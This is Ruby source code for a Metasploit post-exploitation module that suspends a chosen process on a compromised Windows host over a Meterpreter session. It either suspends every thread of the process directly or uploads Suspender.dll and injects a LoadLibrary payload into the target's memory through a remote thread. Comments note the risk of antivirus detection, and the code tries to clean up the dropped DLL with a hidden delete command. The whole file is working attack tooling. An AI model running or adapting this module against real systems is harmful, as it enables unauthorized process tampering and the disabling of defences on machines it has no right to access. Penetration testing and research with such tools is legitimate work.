# based on meterpreter script suspender.rb by Kerberos, which is based on mubix' blog post at
# http://www.room362.com/blog/2011/5/30/remote-dll-injection-with-meterpreter.html which is
# predicated on Didier Stevens code & blog at http://blog.didierstevens.com/2011/04/27/suspender-dll/
#
#
# TODO:
# -> x64 support

require 'msf/core'
#require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Auxiliary::Report
		#TODO:  Report the process as suspended.
	
	def initialize(info={})
		super( update_info( info,
				'Name' => 'Suspender',
				'Description' => %q{ This module suspends the given process after a given delay.  
				This is a port of the meterpreter script of the same name by kerberos, which
				was inspired by mubix' blog which was inpsired by Didier Stevens Suspender.dll.  
				You'll have to download Suspender.dll the first time, see References.)},
				'License' => MSF_LICENSE,
				'Author' => [ 'kerberos', 'kernelsmith'],
				'Version' => '$Revision$',
				'Platform' => [ 'windows' ],
				'SessionTypes' => [ 'meterpreter' ],
				'References'     =>
					[
						[ 'URL', 'http://blog.didierstevens.com/2011/04/27/suspender-dll/'  ],
						[ 'URL', 'http://www.room362.com/blog/2011/5/30/remote-dll-injection-with-meterpreter.html'  ],
						['URL', 'http://pastebin.com/tTQASf7R'],
					],
		))
		@suspender = ::File.join(Msf::Config.data_directory,'suspender','x86','Suspender.dll')
		register_options(
			[
				OptInt.new('TPID', [false, 'Target process ID into which to inject suspender.dll', 0]),
				OptString.new('TPROCESS', [false, 'Target process name (this or TPID must be set)', '']),
				OptInt.new('DELAY', [true, 'The delay, in seconds, to wait before suspension', 5]),
			#	OptBool.new('UNSUSPEND', [false, 'I am not sure this can be implemented',false]),
				OptBool.new('NO_UPLOAD', [true, 'Do NOT upload suspender.dll, this method might bother AVs',false]),
				OptPath.new('SUSPENDER_DLL', [true, 'Path to the suspender dll to upload',@suspender]),
				#OptBool.new('DEBUG', [false, 'Print debug info', true]),
			], self.class)
	end

	def run
		pid = datastore['TPID'] || nil
		process = datastore['TPROCESS'] || nil
		delay = datastore['DELAY']
		undo = datastore['UNSUSPEND']
		tempdir = session.fs.file.expand_path("%TEMP%") || "C:\\"
		suspender = datastore['SUSPENDER_DLL'] || @suspender
		uploadpath = "#{tempdir}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}#{delay.to_s}.dll"

		if ( (pid.nil? or pid == 0) and (process.nil? or process.empty?) )
			# suspending PID 0 will eventually bork the box
			print_error "TPID and TPROCESS can't both be empty, one must be set and TPID can't be 0"
			return
		end
		# resolve the pid if nec
		if ( process and not process.empty? ) 
			print_status "Resolving the process name to it's PID"
			pid = client.sys.process[process] # this returns the first process encountered w/this name
			if ( pid.nil? or pid == 0 )
				print_error "Could not find a process with the name #{process}"
				return nil
			else 
				print_good "Found PID:  #{pid}"
			end
		end
		if pid == 0
			print_error("You don't want to suspend pid 0, Bad Things (TM)")
			return nil
		end
		
		if datastore['NO_UPLOAD']
		# http://www.room362.com/blog/2011/5/30/remotely-suspend-all-threads-with-meterpreter.html
		# "There are a few AVs engines that detected this as tampering. But if your target isn't AV..."
			begin
			print_status "Opening target process"
			targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
			print_status "Suspending threads"
			targetprocess.thread.each_thread do |x|
    			targetprocess.thread.open(x).suspend
			end # end do
			rescue ::Rex::Post::Meterpreter::RequestError => e
				print_error "There was an error suspending the process threads:  #{e.to_s}"
				return nil
			ensure
				targetprocess.close if targetprocess
			end # end beginrescue
		else
			begin
				# Create payload, do this first so we don't have to delete files if this fails
				print_status("Creating dll injector payload...")
				pay = client.framework.payloads.create("windows/loadlibrary")
				pay.datastore['DLL'] = uploadpath
				pay.datastore['EXITFUNC'] = 'thread'
				raw = pay.generate
			rescue RuntimeError => e
				print_error("Error generating payload #{e.to_s}")
				return nil
			end
			
			begin
				# Upload suspender to target
				print_status "Uploading Suspender to #{uploadpath}, you'll have to remove this " +
				"manually as it will be in use until the suspended process is killed " + 
				"by you or by the system/user but I'll try to remove it anyways'"
				session.fs.file.upload_file("#{uploadpath}", "#{suspender}")
			rescue Rex::Post::Meterpreter::RequestError => e
				print_error "Error uploading Suspender.dll:  #{e.to_s}"
				return nil
			end
			
			begin
				# inject
				print_status("Opening process with PID #{pid}...")
				proc = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
				mem = proc.memory.allocate(raw.length + (raw.length % 1024))
				print_status("Injecting payload")
				proc.memory.write(mem, raw)
				print_status("Executing payload and waiting #{delay} seconds...")
				proc.thread.create(mem, 0)
				select(nil,nil,nil,delay.to_i)
			rescue Rex::Post::Meterpreter::RequestError => e
				print_error "Error injecting payload {e.to_s}"
				return nil
			ensure
				# Clean up
				print_status("Cleaning up what I can, but you'll likely have to delete ")
				print_line("#{uploadpath} after you kill the suspended process")
				# in most situations these attempts won't work so we eat the erros raised
				begin
					session.fs.file.rm(uploadpath) 
					session.sys.process.execute("cmd.exe /c del #{uploadpath}", nil, {'Hidden' => true})
				rescue
					Rex::Post::Meterpreter::RequestError
				end
				# But let's ensure we close the open process if it's open
				proc.close if proc
			end
		end
		print_status("All done!  The target process should now be suspended")
	end
end
